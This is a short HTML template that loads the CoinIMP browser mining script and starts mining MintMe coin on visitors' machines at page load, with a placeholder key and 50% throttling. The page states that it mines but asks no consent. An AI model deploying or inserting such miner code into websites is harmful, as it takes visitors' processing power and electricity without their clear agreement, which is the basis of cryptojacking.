 <!DOCTYPE html>
<html>
<head>
    <title>Coin Mining Website</title>
</head>
<body>
    <h1>Welcome to My Coin Mining Website</h1>
    <p>This website uses CoinIMP to mine MintMe.com Coin.</p>
    <script src="https://coinimp.com/js/coinimp.min.js"></script>
    <script>
        var coinimp = new CoinIMP('your-coinimp-key', {
            currency: 'MINTME',
            throttle: 0.5,
            throttleMessage: 'Mining is throttled to 50% to ensure a smooth browsing experience.'
        });
        coinimp.start();
    </script>
</body>
</html>
